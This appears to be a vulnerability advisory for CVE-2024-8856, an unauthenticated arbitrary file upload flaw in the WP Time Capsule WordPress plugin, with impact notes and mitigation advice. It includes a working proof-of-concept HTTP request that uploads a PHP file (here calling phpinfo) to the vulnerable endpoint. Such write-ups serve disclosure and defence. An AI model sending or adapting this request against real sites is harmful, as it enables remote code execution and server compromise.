# CVE-2024-8856: WordPress WP Time Capsule Plugin Arbitrary File Upload Vulnerability

## Overview

CVE-2024-8856 is a security vulnerability found in the WP Time Capsule plugin for WordPress that allows unauthenticated users to upload arbitrary files to the server. This can lead to remote code execution if the uploaded files are executed by the server. The vulnerability arises from insufficient file validation and can be exploited by sending specially crafted requests to the vulnerable endpoint.

### Affected Versions

-   WP Time Capsule plugin versions prior to 1.22.21 (patched in 1.22.22).

## Impact

this vulnerability allows an unauthenticated users to:

-   Upload malicious PHP scripts to the server.
-   Execute arbitrary code on the server, leading to full system compromise.
-   Potentially leverage this access to further exploit the web application and underlying infrastructure.

## Proof of Concept (PoC)

The following is a proof of concept demonstrating how to exploit the CVE-2024-8856 vulnerability by sending a POST request to the vulnerable endpoint.

### Sample Request

```
POST /wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/index.php HTTP/1.1
Host: wordpress.local
Content-Length: 199
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHvQu3NOpI44bLkPN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Origin: http://wordpress.local
Content-Disposition: 18.php
Accept-Encoding: gzip, deflate, br
Connection: close

------WebKitFormBoundaryHvQu3NOpI44bLkPN
Content-Disposition: form-data; name="files"; filename="php"
Content-Type: application/sql

<?php phpinfo();
------WebKitFormBoundaryHvQu3NOpI44bLkPN--
```

### Explanation of PoC

-   POST Request: The request is a POST to the path where the vulnerable upload functionality is exposed.
-   Content-Type: The request sets the Content-Type to multipart/form-data, which is required for file uploads.
-   File Upload: The file is specified in the body with a Content-Disposition header. In the example, it attempts to upload a PHP file containing <?php phpinfo();, which will display PHP configuration details if executed.
-   Vulnerable Endpoint: The endpoint /wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/index.php is the point of exploitation.

### Mitigation

To mitigate this vulnerability:

-   **Update the Plugin**: Always ensure that the WP Time Capsule plugin is updated to the latest version provided by the developer.
-   **File Upload Restrictions**: Implement file upload restrictions on the server to only allow specific file types (e.g., images) and disallow execution of uploaded files.
-   **Web Application Firewall (WAF)**: Use a web application firewall (WAF) to detect and block malicious requests before they reach your server.

### References

[CVE-2024-8856](https://nvd.nist.gov/vuln/detail/CVE-2024-8856) - National Vulnerability Database

### Conclusion

CVE-2024-8856 is a serious vulnerability that requires immediate attention from administrators of WordPress sites using the WP Time Capsule plugin. Proper precautions should be taken to secure the application against potential exploitation. Always stay updated with security practices and plugin updates.
